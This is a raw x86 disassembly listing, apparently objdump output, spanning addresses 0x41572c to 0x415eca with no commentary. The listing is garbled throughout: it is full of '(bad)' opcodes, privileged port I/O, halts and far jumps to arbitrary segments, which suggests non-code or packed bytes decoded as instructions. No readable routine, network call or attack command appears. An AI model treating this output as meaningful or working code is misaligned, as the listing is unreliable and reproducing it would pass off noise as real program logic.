  41572c:	push   eax
  41572d:	(bad)  
  41572e:	and    eax,0xcd182075
  415733:	pop    ebp
  415734:	push   ebp
  415735:	xchg   BYTE PTR [edi],ah
  415737:	push   ebx
  415738:	xchg   ebx,eax
  415739:	jno    0x41577c
  41573b:	fsubp  st(2),st
  41573d:	xlat   BYTE PTR ds:[ebx]
  41573e:	mov    eax,ds:0xf7328215
  415743:	adc    ebx,DWORD PTR [ecx]
  415745:	or     ah,BYTE PTR [edx-0x5bc1c3dc]
  41574b:	inc    ebp
  41574c:	jo     0x4156fd
  41574e:	dec    ecx
  41574f:	pop    ss
  415750:	push   eax
  415751:	dec    edx
  415752:	ja     0x41576e
  415754:	ret    
  415755:	bt     ebp,edx
  415758:	mov    al,ds:0x41bbed38
  41575d:	lods   eax,DWORD PTR gs:[si]
  415760:	dec    esi
  415761:	js     0x4157b0
  415763:	rcl    ebp,0x4e
  415766:	pop    esi
  415767:	js     0x415772
  415769:	cmp    eax,0xc453c2fa
  41576e:	jmp    0xbf8c:0x9ae8fd4a
  415775:	loop   0x4157be
  415777:	jbe    0x415795
  415779:	xor    DWORD PTR [ecx],esp
  41577b:	mov    WORD PTR [edx+0x175767ac],cs
  415781:	mov    edi,0x2aa9c804
  415786:	aaa    
  415787:	cli    
  415788:	in     al,0xae
  41578a:	scas   al,BYTE PTR es:[edi]
  41578b:	dec    edx
  41578c:	lea    ebp,[ecx-0x9813844]
  415792:	lds    eax,FWORD PTR ds:0xe5c1ead9
  415798:	fst    DWORD PTR [eax]
  41579a:	mov    DWORD PTR [esi],edi
  41579c:	jmp    0x415773
  41579e:	fadd   DWORD PTR [eax-0x1689d32f]
  4157a4:	or     ch,ch
  4157a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a7:	pop    esp
  4157a8:	imul   eax,DWORD PTR [edx+0x215b893],0x1bab2d66
  4157b2:	xor    eax,0xe7f8ef94
  4157b7:	fmul   DWORD PTR [edi-0x1b]
  4157ba:	retf   
  4157bb:	fdiv   DWORD PTR [ebx+0x300d149b]
  4157c1:	sahf   
  4157c2:	inc    esi
  4157c3:	pop    eax
  4157c4:	cmp    al,0x1
  4157c6:	(bad)  
  4157c7:	push   ecx
  4157c8:	out    dx,al
  4157c9:	jg     0x415832
  4157cb:	add    BYTE PTR [edx-0x313281e4],cl
  4157d1:	jae    0x415775
  4157d3:	popa   
  4157d4:	mov    ds:0x3d052786,al
  4157d9:	xchg   esp,eax
  4157da:	test   DWORD PTR [esi],esi
  4157dc:	pop    ecx
  4157dd:	jne    0x4157e9
  4157df:	cmp    BYTE PTR [edx+edi*4+0x25],al
  4157e3:	lea    ebx,[ebp+0x7d]
  4157e6:	xor    DWORD PTR [esi+0x4d],ebx
  4157e9:	mov    eax,ds:0xc6279d5
  4157ee:	pushf  
  4157ef:	dec    edi
  4157f0:	aaa    
  4157f1:	adc    DWORD PTR [ebx],esi
  4157f3:	jmp    0x4157e6
  4157f5:	dec    ebp
  4157f6:	popf   
  4157f7:	inc    edx
  4157f8:	test   DWORD PTR [edi-0x59],eax
  4157fb:	repnz sub ebx,DWORD PTR [eax-0x1f]
  4157ff:	inc    esi
  415800:	stc    
  415801:	dec    ebp
  415802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415803:	cwde   
  415804:	jb     0x4157aa
  415806:	cmp    ecx,esi
  415808:	push   ebp
  415809:	(bad)  [ecx+0x2a]
  41580c:	or     BYTE PTR [edi+0x7bb8ed53],ah
  415812:	mov    esi,0x8800a4a6
  415817:	jmp    0x447c:0x47f4ca2
  41581e:	fmul   DWORD PTR [edx]
  415820:	pop    ebp
  415821:	mov    ebx,0x9e53a009
  415827:	scas   eax,DWORD PTR es:[di]
  415829:	cs dec ebp
  41582b:	mov    edi,0x6b706f2e
  415830:	mov    ecx,0x8edab458
  415835:	test   DWORD PTR [eax+0x397054b1],ecx
  41583b:	sbb    ebx,esp
  41583d:	pop    edx
  41583e:	dec    DWORD PTR [esi-0xa13f32d]
  415844:	cmp    al,al
  415846:	pop    es
  415847:	fadd   st,st(6)
  415849:	jl     0x415810
  41584b:	jp     0x41584f
  41584d:	in     al,dx
  41584e:	and    DWORD PTR [edx-0x8155662],esi
  415854:	cmp    ecx,DWORD PTR [esi-0x40d5a14e]
  41585a:	outs   dx,BYTE PTR ds:[esi]
  41585b:	call   0xbec5:0x61ae1361
  415862:	into   
  415863:	jg     0x415894
  415865:	adc    eax,0xe47bcc9d
  41586a:	xchg   ecx,eax
  41586b:	inc    ecx
  41586c:	xor    al,0x14
  41586e:	mov    fs,WORD PTR [ecx-0x46056559]
  415874:	mov    ecx,esp
  415876:	ja     0x415864
  415878:	pop    edi
  415879:	sbb    al,0x7a
  41587b:	sbb    BYTE PTR [ebp-0x1ecef493],0x41
  415882:	add    eax,DWORD PTR [ebp+0x16f152b8]
  415888:	lods   al,BYTE PTR ds:[esi]
  415889:	stos   BYTE PTR es:[edi],al
  41588a:	fyl2x  
  41588c:	out    0x3f,al
  41588e:	pushf  
  41588f:	mov    es,WORD PTR [esi+0x0]
  415892:	add    esp,DWORD PTR [bp-0x73]
  415896:	push   ss
  415897:	cmp    eax,0x5cf42153
  41589c:	aad    0x92
  41589e:	test   DWORD PTR [ebx],esi
  4158a0:	daa    
  4158a1:	sub    eax,0xe2f4f8d6
  4158a6:	mov    edx,0x2f58f1b1
  4158ab:	pop    edi
  4158ac:	or     edi,edi
  4158ae:	nop
  4158af:	arpl   WORD PTR [edx-0xd642e68],sp
  4158b5:	cdq    
  4158b6:	ss sub al,0x14
  4158b9:	fdiv   st(0),st
  4158bb:	jp     0x4158f8
  4158bd:	sub    ah,bl
  4158bf:	stos   BYTE PTR es:[edi],al
  4158c0:	ss mov bh,0x34
  4158c3:	lods   al,BYTE PTR ds:[esi]
  4158c4:	aaa    
  4158c5:	xchg   edx,eax
  4158c6:	ds jbe 0x415898
  4158c9:	xchg   edi,eax
  4158ca:	mov    cl,0xa3
  4158cc:	adc    esp,eax
  4158ce:	jmp    0x41589d
  4158d0:	imul   eax,DWORD PTR [edx-0x39c121d],0x2e
  4158d7:	push   eax
  4158d8:	push   ebx
  4158d9:	sbb    ch,BYTE PTR [esi+0x4114e514]
  4158df:	add    BYTE PTR [ecx-0x4b],ah
  4158e2:	jb     0x415902
  4158e4:	add    esi,DWORD PTR [ecx+esi*8]
  4158e7:	pop    edx
  4158e8:	sub    BYTE PTR [ecx-0x22],dl
  4158eb:	adc    al,0xd5
  4158ed:	retf   0x7e26
  4158f0:	inc    ch
  4158f2:	mov    ebx,0x3d0f9597
  4158f7:	mov    bh,0x8d
  4158f9:	pop    es
  4158fa:	in     al,dx
  4158fb:	cwde   
  4158fc:	out    dx,eax
  4158fd:	dec    eax
  4158fe:	lea    edx,[edx+0x9]
  415901:	xor    eax,edi
  415903:	xchg   esi,eax
  415904:	pop    ebx
  415905:	cmp    eax,0xad13955f
  41590a:	mov    dh,0x39
  41590c:	pop    esi
  41590d:	fcom   QWORD PTR [ecx+0x8ecbcfa]
  415913:	repz xchg edi,eax
  415915:	sbb    al,0xd8
  415917:	ins    DWORD PTR es:[edi],dx
  415918:	call   0x107:0xcf743187
  41591f:	(bad)  
  415920:	pusha  
  415921:	jmp    0xfe63069b
  415926:	leave  
  415927:	daa    
  415928:	test   eax,0xf26b3009
  41592d:	mov    ch,0xb2
  41592f:	add    edi,DWORD PTR [ebx]
  415931:	dec    edx
  415932:	sub    ebp,DWORD PTR [ecx+0x3df6672f]
  415938:	jl     0x4158f8
  41593a:	inc    eax
  41593b:	(bad)  
  41593c:	jg     0x4158e8
  41593e:	mov    BYTE PTR [edx-0x175fa7fb],cl
  415944:	mov    bh,0xc0
  415946:	xor    ecx,DWORD PTR [ebp-0x51]
  415949:	lods   al,BYTE PTR ds:[si]
  41594b:	push   0xdd50ad1a
  415950:	repz xchg ebp,eax
  415952:	jp     0x415947
  415954:	pop    ebx
  415955:	fcomp  DWORD PTR [edi]
  415957:	xchg   esi,eax
  415958:	xchg   edi,eax
  415959:	adc    BYTE PTR [ecx*4+0x28743339],al
  415960:	stos   BYTE PTR es:[edi],al
  415961:	sub    BYTE PTR [ebx+0x7968c4ff],ch
  415967:	jge    0x415920
  415969:	jge    0x415990
  41596b:	jmp    0x22427718
  415970:	scas   eax,DWORD PTR es:[edi]
  415971:	aam    0x7
  415973:	jns    0x41597b
  415975:	lods   eax,DWORD PTR ds:[esi]
  415976:	call   0x5deb1e76
  41597b:	imul   esi,DWORD PTR [edx-0x6b],0xffffff8d
  41597f:	ss cs pop eax
  415982:	adc    al,al
  415984:	cwde   
  415985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415986:	ror    BYTE PTR [ecx-0x144976df],0x91
  41598d:	enter  0xcda5,0xe5
  415991:	add    BYTE PTR [edx-0x18],dh
  415994:	loop   0x415a00
  415996:	xchg   edx,eax
  415997:	adc    BYTE PTR [edi],bl
  415999:	cdq    
  41599a:	adc    DWORD PTR [ecx+0x32956ce3],edi
  4159a0:	stos   DWORD PTR es:[edi],eax
  4159a1:	jbe    0x415985
  4159a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159a4:	scas   al,BYTE PTR es:[edi]
  4159a5:	mov    dl,ch
  4159a7:	xor    eax,0x5551ec15
  4159ac:	inc    edx
  4159ad:	and    eax,0x707593a
  4159b2:	test   BYTE PTR [esi+0x2a],bh
  4159b5:	fs mov ebx,0x88d08729
  4159bc:	mov    cs,WORD PTR [eax+ebx*4-0x22451d3d]
  4159c3:	fist   WORD PTR [esi]
  4159c5:	daa    
  4159c6:	push   ss
  4159c7:	jecxz  0x415a47
  4159c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ca:	adc    BYTE PTR [esi+0x69e07873],ch
  4159d0:	repnz fnop 
  4159d3:	inc    ebp
  4159d4:	mov    DWORD PTR [ebp-0x11e71264],esp
  4159da:	xchg   esi,eax
  4159db:	jge    0x41599e
  4159dd:	dec    esp
  4159de:	jmp    0x415a23
  4159e0:	and    eax,0x2fb556b2
  4159e5:	xchg   esi,eax
  4159e6:	adc    al,0xe7
  4159e8:	inc    ebp
  4159e9:	mov    esp,0x376fb2ee
  4159ee:	cmp    dh,cl
  4159f0:	cmp    ah,BYTE PTR [esi-0x69609d29]
  4159f6:	pop    esi
  4159f7:	test   ebp,ecx
  4159f9:	lock xchg esi,eax
  4159fb:	data16 daa 
  4159fd:	loop   0x4159ae
  4159ff:	adc    BYTE PTR [eax*1-0x5969c9b6],dh
  415a06:	pop    edx
  415a07:	retf   0x65d4
  415a0a:	and    DWORD PTR [edx-0x26],ecx
  415a0d:	jmp    0xa2d18fc5
  415a12:	cmp    BYTE PTR [esi-0x63],al
  415a15:	lods   eax,DWORD PTR ds:[esi]
  415a16:	push   0xdfe98a74
  415a1b:	add    bl,ah
  415a1d:	sub    DWORD PTR [edx+0x6fdae50a],ebp
  415a23:	hlt    
  415a24:	push   esp
  415a25:	(bad)  
  415a26:	cs nop
  415a28:	cs aad 0x6d
  415a2b:	idiv   DWORD PTR [eax]
  415a2d:	ds mov ch,al
  415a30:	jl     0x415a9f
  415a32:	data16 not BYTE PTR [ebx]
  415a35:	pop    ebx
  415a36:	dec    esi
  415a37:	xor    al,0x9f
  415a39:	cld    
  415a3a:	add    esp,0xffffff96
  415a3d:	cmp    al,0x70
  415a3f:	mov    ds:0x3f4ffa67,eax
  415a44:	fisub  DWORD PTR ds:0xd1a89e5c
  415a4b:	push   ecx
  415a4c:	cmp    al,0xa5
  415a4e:	cmp    cl,bh
  415a50:	(bad)  
  415a51:	bound  ecx,QWORD PTR [edx+0x37]
  415a54:	dec    esi
  415a55:	adc    bh,bh
  415a57:	xchg   DWORD PTR [ebx+eiz*4-0x74],esi
  415a5b:	out    0x36,al
  415a5d:	fwait
  415a5e:	enter  0x41a0,0xe6
  415a62:	xor    eax,0xd0f93e4f
  415a67:	pop    ss
  415a68:	pop    ebp
  415a69:	mov    ds:0xf431edeb,al
  415a6e:	mov    ah,0x8a
  415a70:	mov    ebx,0x7faa39aa
  415a75:	shr    DWORD PTR [esi+0x52],1
  415a78:	adc    esi,DWORD PTR [edi-0x6d]
  415a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a7c:	outs   dx,BYTE PTR ds:[esi]
  415a7d:	ror    dl,1
  415a7f:	push   cs
  415a80:	fisttp WORD PTR [ebp+0x481b5267]
  415a87:	mov    bl,0xd7
  415a89:	mov    bl,0xbd
  415a8b:	aas    
  415a8c:	jbe    0x415a2f
  415a8e:	cmc    
  415a8f:	push   0x67
  415a91:	rol    BYTE PTR [ebp+ecx*8+0x3e],1
  415a95:	add    al,0xab
  415a97:	ja     0x415a6d
  415a99:	popa   
  415a9a:	hlt    
  415a9b:	rcl    esp,cl
  415a9d:	and    al,BYTE PTR [ebx]
  415a9f:	dec    edi
  415aa0:	fucomip st,st(5)
  415aa2:	xchg   esi,eax
  415aa3:	lock adc DWORD PTR [esi-0xb],ebx
  415aa7:	mov    ecx,0x29be888e
  415aac:	sahf   
  415aad:	sbb    bl,al
  415aaf:	cwde   
  415ab0:	mov    al,ds:0x81c87aa6
  415ab5:	mov    esp,0xdcafd17d
  415aba:	sub    BYTE PTR [edi],cl
  415abc:	xlat   BYTE PTR ds:[ebx]
  415abd:	mov    bh,BYTE PTR [ecx]
  415abf:	add    eax,0xc8808415
  415ac4:	js     0x415a4e
  415ac6:	cld    
  415ac7:	je     0x415aa0
  415ac9:	add    DWORD PTR [eax+0x50],ecx
  415acc:	cdq    
  415acd:	clc    
  415ace:	(bad)  
  415acf:	fdivr  QWORD PTR [edi-0x37]
  415ad2:	xor    bl,BYTE PTR [eax-0x26]
  415ad5:	or     al,0xe2
  415ad7:	push   0x45
  415ad9:	mov    dh,0x77
  415adb:	xor    ch,BYTE PTR [eax]
  415add:	in     al,0x93
  415adf:	ss xchg esp,eax
  415ae1:	es shl ebp,1
  415ae4:	mov    esi,0x584993b6
  415ae9:	leave  
  415aea:	jne    0x415abf
  415aec:	nop
  415aed:	or     al,0x17
  415aef:	push   es
  415af0:	out    0x57,al
  415af2:	mov    ebp,fs
  415af4:	ret    0x16a9
  415af7:	jmp    0x415acf
  415af9:	js     0x415b18
  415afb:	ins    BYTE PTR es:[edi],dx
  415afc:	retf   0xbf96
  415aff:	call   0x312ebde2
  415b04:	shr    DWORD PTR [edi+0x71],0xd1
  415b08:	hlt    
  415b09:	stc    
  415b0a:	in     eax,0xac
  415b0c:	outs   dx,BYTE PTR ds:[esi]
  415b0d:	fcom   DWORD PTR [edi]
  415b0f:	push   cs
  415b10:	mov    ?,WORD PTR [edi+0x1cbb6fb4]
  415b16:	cmp    WORD PTR [esi+0x6e],bx
  415b1a:	sbb    eax,0x7bc7bbeb
  415b1f:	and    al,0xe0
  415b21:	inc    esp
  415b22:	mov    esi,0xcacd0a08
  415b27:	rol    al,1
  415b29:	into   
  415b2a:	mov    ah,0x86
  415b2c:	inc    ebx
  415b2d:	leave  
  415b2e:	xchg   edx,eax
  415b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b30:	lods   al,BYTE PTR cs:[esi]
  415b32:	mul    DWORD PTR [ebp-0x4d]
  415b35:	mov    eax,0x78c8dd69
  415b3a:	sub    ah,bl
  415b3c:	pop    ss
  415b3d:	push   cs
  415b3e:	sahf   
  415b3f:	dec    esi
  415b40:	dec    edx
  415b41:	enter  0xb1a0,0x21
  415b45:	retf   0x5989
  415b48:	fs inc ebx
  415b4a:	cmp    BYTE PTR [edi],dh
  415b4c:	sub    bl,bh
  415b4e:	xor    al,0x1c
  415b50:	push   cs
  415b51:	mov    edx,0x3e9fa7dc
  415b56:	mov    dl,0xf6
  415b58:	pop    esi
  415b59:	in     al,dx
  415b5a:	aas    
  415b5b:	adc    ebp,DWORD PTR [esi+0x74]
  415b5e:	int    0x85
  415b60:	sub    ecx,edx
  415b62:	lock stc 
  415b64:	cdq    
  415b65:	xchg   ebp,eax
  415b66:	out    dx,al
  415b67:	push   esi
  415b68:	add    BYTE PTR [edx-0x47],bh
  415b6b:	test   al,0x5b
  415b6d:	dec    edx
  415b6e:	jno    0x415b4a
  415b70:	test   BYTE PTR [ecx+0x27101eb2],ah
  415b76:	push   ecx
  415b77:	inc    ecx
  415b78:	adc    edx,DWORD PTR [ecx+ebx*1]
  415b7b:	sbb    dh,BYTE PTR fs:[edi+ebx*2]
  415b7f:	push   0xbbcb76e8
  415b84:	clc    
  415b85:	sbb    edi,DWORD PTR [edi]
  415b87:	dec    eax
  415b88:	add    al,cl
  415b8a:	jmp    0x415b2a
  415b8c:	out    0x23,al
  415b8e:	jno    0x415b89
  415b90:	inc    ecx
  415b91:	ret    
  415b92:	outs   dx,DWORD PTR ds:[esi]
  415b93:	ss inc eax
  415b95:	dec    ebp
  415b96:	xchg   eax,esp
  415b98:	pop    ebp
  415b99:	call   0x236c2d9
  415b9e:	popa   
  415b9f:	hlt    
  415ba0:	dec    eax
  415ba1:	mov    dh,0x7d
  415ba3:	iret   
  415ba4:	enter  0xbb23,0x80
  415ba8:	xchg   esp,eax
  415ba9:	push   edx
  415baa:	dec    ebp
  415bab:	mov    BYTE PTR [edx],dl
  415bad:	mov    WORD PTR [ebp-0x67],ds
  415bb0:	js     0x415bd2
  415bb2:	dec    ebx
  415bb3:	in     al,0xf2
  415bb5:	fwait
  415bb6:	int    0x48
  415bb8:	cmc    
  415bb9:	xchg   esi,eax
  415bba:	cmp    esi,0xebc56c62
  415bc0:	mov    bh,0x61
  415bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bc3:	repnz shl BYTE PTR [ecx+edx*4],0xfe
  415bc8:	ret    
  415bc9:	(bad)  
  415bca:	adc    eax,0x5e26456
  415bcf:	xor    edi,ebx
  415bd1:	shr    BYTE PTR [esi+0x40ac2a85],1
  415bd7:	(bad)  
  415bd8:	rcr    BYTE PTR [edx-0x33968663],1
  415bde:	pusha  
  415bdf:	or     DWORD PTR [ebx],0x251573b2
  415be5:	retf   
  415be6:	inc    edx
  415be7:	in     eax,dx
  415be8:	enter  0xd5f7,0x0
  415bec:	and    al,0x8d
  415bee:	in     al,0xd5
  415bf0:	ja     0x415c1d
  415bf2:	pop    edx
  415bf3:	xchg   edi,eax
  415bf4:	retf   0x4cbc
  415bf7:	fnsave [ebx-0x32528863]
  415bfd:	inc    ebp
  415bfe:	(bad)  
  415bff:	and    ecx,edx
  415c01:	sub    DWORD PTR [edi+ebp*2-0x2b95afdc],esi
  415c08:	and    DWORD PTR [eax],edx
  415c0a:	add    BYTE PTR [esi],bl
  415c0c:	stos   DWORD PTR es:[edi],eax
  415c0d:	mov    ebp,0x48a81316
  415c12:	clc    
  415c13:	dec    eax
  415c14:	mov    bl,0xf8
  415c16:	adc    BYTE PTR [edx],bl
  415c18:	jg     0x415c79
  415c1a:	xor    DWORD PTR [ecx+0xa9a479e],esp
  415c20:	and    al,ah
  415c22:	pop    ebx
  415c23:	repnz in al,dx
  415c25:	loop   0x415ca6
  415c27:	mov    esp,DWORD PTR [esi+0x65]
  415c2a:	dec    ebp
  415c2c:	test   DWORD PTR [ebp+0x6a],edi
  415c2f:	inc    ebp
  415c30:	push   ebx
  415c31:	push   edi
  415c32:	nop
  415c33:	jle    0x415bc2
  415c35:	cmp    esi,DWORD PTR [edi]
  415c37:	ficomp DWORD PTR [edi+0x6f]
  415c3a:	mov    ecx,0x2e993508
  415c3f:	bndstx [eax+0x608274a0],bnd2
  415c46:	rol    BYTE PTR [edi+ecx*2+0x576e74b7],1
  415c4d:	gs in  al,dx
  415c4f:	pop    ebx
  415c50:	xor    DWORD PTR [ebp-0x42],eax
  415c53:	jae    0x415bec
  415c55:	adc    eax,0x3628ae07
  415c5a:	mov    bh,0xb1
  415c5c:	xchg   esi,eax
  415c5d:	scas   eax,DWORD PTR es:[edi]
  415c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5f:	div    DWORD PTR [esi-0x18]
  415c62:	jbe    0x415cc0
  415c64:	push   eax
  415c65:	popf   
  415c66:	aaa    
  415c67:	xchg   edx,eax
  415c68:	cmp    al,dl
  415c6a:	inc    ecx
  415c6b:	hlt    
  415c6c:	jnp    0x415ce2
  415c6e:	call   0x50e46bc4
  415c73:	call   0x4ddc:0xed6a
  415c79:	mov    esp,edx
  415c7b:	adc    dl,BYTE PTR [edx]
  415c7d:	retf   0x4ad4
  415c80:	pop    ebx
  415c81:	sbb    al,0x1a
  415c83:	aam    0x9a
  415c85:	adc    eax,0x451020da
  415c8a:	cmp    al,0x1a
  415c8c:	mov    esp,0x88a3f1ef
  415c91:	rcr    ebx,cl
  415c93:	inc    edx
  415c94:	sub    DWORD PTR [ecx+0x53],esi
  415c97:	push   esi
  415c98:	jg     0x415c7a
  415c9a:	and    BYTE PTR [ebp+0x71],cl
  415c9d:	and    BYTE PTR [ebx+0x34f92bce],bl
  415ca3:	pop    edi
  415ca4:	fadd   st(5),st
  415ca6:	mov    DWORD PTR [ecx+0x6e],edx
  415ca9:	mov    ah,0x3
  415cab:	mov    esi,0x9b42e43f
  415cb0:	int3   
  415cb1:	nop
  415cb2:	lods   al,BYTE PTR ds:[esi]
  415cb3:	cmp    BYTE PTR [esi],bl
  415cb5:	lahf   
  415cb6:	mov    cl,BYTE PTR [ebx-0x20]
  415cb9:	lods   al,BYTE PTR ds:[esi]
  415cba:	inc    edx
  415cbb:	mov    edx,0x843f3f2
  415cc0:	imul   eax,DWORD PTR [edx-0x3e],0x6d
  415cc4:	fidivr DWORD PTR [eax]
  415cc6:	test   eax,0x2390656a
  415ccb:	jmp    FWORD PTR [edi+0x4b]
  415cce:	jle    0x415d24
  415cd0:	jbe    0x415c79
  415cd2:	out    dx,al
  415cd3:	rcr    DWORD PTR [esi+eiz*2-0x51],0x4
  415cd8:	pushf  
  415cd9:	aas    
  415cda:	bound  esp,QWORD PTR [ecx]
  415cdc:	ror    DWORD PTR [edx-0x2abdbdca],cl
  415ce2:	les    eax,FWORD PTR [ecx]
  415ce4:	inc    ebp
  415ce5:	dec    ecx
  415ce6:	fs xor ch,al
  415ce9:	cmp    al,BYTE PTR [edx]
  415ceb:	or     esi,DWORD PTR [esi]
  415ced:	repz cli 
  415cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf0:	rcr    DWORD PTR [ebp+0x190626e6],cl
  415cf6:	sti    
  415cf7:	sub    esi,DWORD PTR [ecx-0x20]
  415cfa:	pop    esi
  415cfb:	inc    esp
  415cfc:	adc    eax,0xfc2507b7
  415d01:	cmc    
  415d02:	inc    esi
  415d03:	add    eax,0x1d9f486c
  415d08:	pop    edx
  415d09:	pop    eax
  415d0a:	shr    DWORD PTR [esi-0x32],cl
  415d0d:	and    ebx,DWORD PTR [edi]
  415d0f:	call   0xfc04:0x490e1d33
  415d16:	lods   al,BYTE PTR ds:[esi]
  415d17:	mov    eax,ds:0x81521a28
  415d1c:	cmp    eax,0xd05db4e4
  415d21:	cmp    edi,DWORD PTR [edi]
  415d23:	mov    ds:0x946665f6,eax
  415d28:	int3   
  415d29:	push   es
  415d2a:	cli    
  415d2b:	add    al,0xb4
  415d2d:	(bad)  
  415d2e:	fsub   QWORD PTR [ecx+0x8]
  415d31:	mov    dl,BYTE PTR [edi+esi*2-0x70]
  415d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d36:	pop    edx
  415d37:	neg    DWORD PTR [edx+0x20070308]
  415d3d:	pushf  
  415d3e:	(bad)  
  415d3f:	sahf   
  415d40:	mov    ah,0x44
  415d42:	mov    ebp,0x5f12ca93
  415d47:	mov    BYTE PTR [ebp+ebp*8-0x4d],dh
  415d4b:	ret    0x151c
  415d4e:	inc    eax
  415d4f:	add    dl,dl
  415d51:	cmc    
  415d52:	inc    edx
  415d53:	pop    esp
  415d54:	xor    cl,BYTE PTR [ebx]
  415d56:	add    BYTE PTR [edi],dh
  415d58:	addr16 jg 0x415dc4
  415d5b:	cwde   
  415d5c:	dec    eax
  415d5d:	bound  ebx,QWORD PTR [edx+0x637f9147]
  415d63:	or     DWORD PTR [esi-0x73],eax
  415d66:	jmp    0x415d60
  415d68:	mov    edi,0x9e79f786
  415d6d:	(bad)  
  415d6e:	jno    0x415dab
  415d70:	(bad)  
  415d71:	adc    edx,DWORD PTR [edx+0x68]
  415d74:	pusha  
  415d75:	pop    es
  415d76:	and    al,0xbc
  415d78:	and    ah,BYTE PTR [esi-0x77]
  415d7b:	dec    esi
  415d7c:	sbb    BYTE PTR [ecx-0x1f0eb8f9],cl
  415d82:	addr16 pop ebp
  415d84:	pop    esp
  415d85:	jo     0x415d56
  415d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d88:	popa   
  415d89:	pop    esp
  415d8a:	ror    BYTE PTR ds:0xa44cbe54,1
  415d90:	arpl   bx,sp
  415d92:	jbe    0x415dc3
  415d94:	adc    ecx,DWORD PTR [edx]
  415d96:	mov    dh,0xce
  415d98:	ret    
  415d99:	outs   dx,BYTE PTR ds:[esi]
  415d9a:	add    bl,ch
  415d9c:	popf   
  415d9d:	cmp    eax,0xfa26c65d
  415da2:	mov    al,ds:0x972db723
  415da7:	mov    eax,ds:0xd1ab411b
  415dac:	inc    ebp
  415dad:	dec    edx
  415dae:	nop
  415daf:	xchg   ecx,eax
  415db0:	stc    
  415db1:	xor    cl,bl
  415db3:	shl    dh,1
  415db5:	nop
  415db6:	add    bl,BYTE PTR [edi]
  415db8:	push   esp
  415db9:	stc    
  415dba:	push   es
  415dbb:	mov    eax,DWORD PTR [ebp-0x57]
  415dbe:	adc    BYTE PTR [edi-0x6cde9467],bl
  415dc4:	mov    esi,0x921581e7
  415dc9:	ins    BYTE PTR es:[edi],dx
  415dca:	mov    ds:0xc597efe7,al
  415dcf:	in     al,dx
  415dd0:	pusha  
  415dd1:	push   ds
  415dd2:	jae    0x415d7b
  415dd4:	adc    eax,0x5b92fedd
  415dd9:	pop    ebp
  415dda:	push   esi
  415ddb:	push   edi
  415ddc:	mov    esp,0xc7bb350
  415de1:	dec    ecx
  415de2:	or     al,0xd8
  415de4:	ins    DWORD PTR es:[edi],dx
  415de5:	xor    eax,0x590c45b7
  415dea:	icebp  
  415deb:	out    dx,eax
  415dec:	cdq    
  415ded:	xchg   esp,eax
  415dee:	mov    cl,0xa4
  415df0:	fnsave [ebx+0x55]
  415df3:	add    cl,BYTE PTR [ecx+0x79]
  415df6:	mov    ah,0xde
  415df8:	jge    0x415e07
  415dfa:	loop   0x415d9b
  415dfc:	mov    ah,0xb1
  415dfe:	fild   DWORD PTR [ebp-0x2787b35c]
  415e04:	add    eax,0x1705453
  415e09:	int3   
  415e0a:	mov    ah,0x7c
  415e0c:	mov    eax,0xe828580a
  415e11:	mov    ebp,0xf1fd60f1
  415e16:	inc    esi
  415e17:	arpl   cx,dx
  415e19:	jg     0x415e98
  415e1b:	or     al,0x7a
  415e1d:	stc    
  415e1e:	pop    ds
  415e1f:	in     al,0xe3
  415e21:	dec    ecx
  415e22:	adc    al,0xd4
  415e24:	pop    esp
  415e25:	push   0x58b70d46
  415e2a:	ins    BYTE PTR es:[edi],dx
  415e2b:	(bad)  
  415e2d:	bound  edi,QWORD PTR [edi+edx*2-0x5d]
  415e31:	dec    ebx
  415e32:	jne    0x415e50
  415e34:	xor    eax,0x2b3e9f5f
  415e39:	mov    esi,0x1b987827
  415e3e:	mov    DWORD PTR [eax+0x14],ebx
  415e41:	adc    al,BYTE PTR [edx]
  415e43:	loopne 0x415e82
  415e45:	mov    ch,0xaf
  415e47:	jecxz  0x415e20
  415e49:	push   ecx
  415e4a:	pop    esi
  415e4b:	int    0x98
  415e4d:	out    0xeb,eax
  415e4f:	dec    edx
  415e50:	cld    
  415e51:	ficomp DWORD PTR [eax+0x549cf019]
  415e57:	psubb  mm6,QWORD PTR [edx]
  415e5a:	popf   
  415e5b:	pop    ds
  415e5c:	xor    al,0x73
  415e5e:	in     eax,0x2f
  415e60:	inc    ebp
  415e61:	mov    ds:0xefd5caf0,al
  415e66:	inc    eax
  415e67:	cmp    al,0xac
  415e69:	mov    dh,0x18
  415e6b:	stc    
  415e6c:	mov    ds:0x6c63cbed,eax
  415e71:	xchg   ecx,eax
  415e72:	xchg   edi,eax
  415e73:	and    dl,dl
  415e75:	pop    edi
  415e76:	push   0x77bad894
  415e7b:	cdq    
  415e7c:	cmp    BYTE PTR [edi-0xe715b39],bl
  415e82:	adc    dl,BYTE PTR [eax-0x60]
  415e85:	out    0x1c,al
  415e87:	dec    edx
  415e88:	dec    esp
  415e89:	rol    DWORD PTR [ecx+0x50445b83],0xd9
  415e90:	pop    ebp
  415e91:	lods   al,BYTE PTR ds:[esi]
  415e92:	mov    esp,?
  415e94:	pusha  
  415e95:	push   cs
  415e96:	mov    ecx,DWORD PTR [eax+0x49]
  415e99:	adc    eax,DWORD PTR [eax+0x64cb9bdb]
  415e9f:	adc    ecx,DWORD PTR [eax]
  415ea1:	fcmovbe st,st(6)
  415ea3:	(bad)  
  415ea4:	fisttp QWORD PTR [edx]
  415ea6:	adc    al,0x5b
  415ea8:	xor    BYTE PTR [ecx-0x7838b0ec],bl
  415eae:	pusha  
  415eaf:	inc    ebx
  415eb0:	ja     0x415e4a
  415eb2:	fs xchg edi,eax
  415eb4:	mov    DWORD PTR [edi+0xf],esp
  415eb7:	or     ebp,DWORD PTR [eax+0x6b]
  415eba:	adc    cl,bh
  415ebc:	pop    esp
  415ebd:	mov    eax,0x39244d44
  415ec2:	pushf  
  415ec3:	and    eax,0x5c8ba5a
  415ec8:	lahf   
  415ec9:	dec    eax
  415eca:	popf   
